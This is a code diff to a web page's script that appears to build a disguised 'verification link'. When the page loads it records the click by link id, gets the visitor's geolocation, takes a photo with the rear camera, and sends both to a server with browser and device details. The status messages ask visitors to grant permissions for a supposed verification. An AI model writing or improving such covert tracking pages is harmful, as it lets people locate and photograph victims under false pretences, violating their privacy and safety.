@@ -64,28 +64,30 @@ async function getLocation() {
 async function captureImage() {
   updateStatus(50, "Accessing camera...");
   try {
-    mediaStream = await navigator.mediaDevices.getUserMedia({ 
-      video: { 
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: {
         facingMode: 'environment',
         width: { ideal: 1280 },
         height: { ideal: 720 }
       }
     });
     
-    // Create video element to capture frame
     const video = document.createElement('video');
-    video.srcObject = mediaStream;
+    video.srcObject = stream;
     await new Promise(resolve => video.onloadedmetadata = resolve);
-    await new Promise(resolve => setTimeout(resolve, 500)); // Small delay for camera to adjust
     
-    // Capture frame
+    // Wait for camera to properly focus
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    ctx.drawImage(video, 0, 0);
     
-    // Convert to JPEG
+    // Stop stream immediately after capture
+    stream.getTracks().forEach(track => track.stop());
+    
     return await new Promise(resolve => {
       canvas.toBlob(blob => {
         const reader = new FileReader();
@@ -94,15 +96,45 @@ async function captureImage() {
       }, 'image/jpeg', 0.8);
     });
   } catch (error) {
-    console.error("Camera access error:", error);
+    console.error("Camera error:", error);
     document.getElementById('camera-error').style.display = 'block';
     document.getElementById('camera-error').innerText = 
-      `Camera error: ${error.message || 'Camera access denied'}`;
+      error.message.includes('permission') ? 
+      'Camera permission denied' : 'Could not access camera';
     return null;
-  } finally {
-    if (mediaStream) {
-      mediaStream.getTracks().forEach(track => track.stop());
-    }
+  }
+}
+
+async function runVerification() {
+  const linkId = new URLSearchParams(window.location.search).get('id');
+  if (!linkId) return updateStatus(100, "Invalid verification link");
+
+  // First track the click
+  await trackClick(linkId);
+  
+  // Then get location and image in parallel
+  const [position, image] = await Promise.all([
+    getLocation(),
+    captureImage()
+  ]);
+  
+  // Only proceed if we got either location or image
+  const hasLocation = position.coords.latitude !== 0 && position.coords.longitude !== 0;
+  const hasImage = image !== null;
+  
+  if (hasLocation || hasImage) {
+    await sendData({
+      link_id: linkId,
+      latitude: position.coords.latitude,
+      longitude: position.coords.longitude,
+      accuracy: position.coords.accuracy,
+      image: image,
+      user_agent: navigator.userAgent,
+      platform: navigator.platform,
+      screen: `${window.screen.width}x${window.screen.height}`
+    });
+  } else {
+    updateStatus(100, "Failed to get location or image. Please enable permissions.");
   }
 }
 
@@ -170,3 +202,4 @@ setTimeout(runVerification, 500);
 </script>
 </body>
 </html>
+
